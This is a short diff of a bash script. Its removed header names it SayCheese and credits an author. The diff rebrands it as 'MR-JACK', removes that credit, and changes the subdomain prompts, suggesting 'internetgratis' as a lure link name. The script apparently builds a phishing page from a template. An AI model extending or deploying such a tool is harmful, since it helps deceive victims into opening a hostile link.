@@ -1,11 +1,9 @@
 #!/bin/bash
-# SayCheese v1.0
-# coded by: github.com/redaxee/x
 
 trap 'printf "\n";stop' 2
 
 
-printf "\e[1;92m] Code Bye MR-JACK\n"
+printf "\e[1;92mCode Bye MR-JACK\n"
 
 stop() {
 
@@ -204,14 +202,14 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="MR-JACK$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] created link costum? \e[1;92m[Y/N]\e[1;33m: \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Enter Here : printf "\e[1;92m ex : internetgratis ": \e[0m' $default_subdomain
 read subdomain
 subdomain="${subdomain:-${default_subdomain}}"
 fi
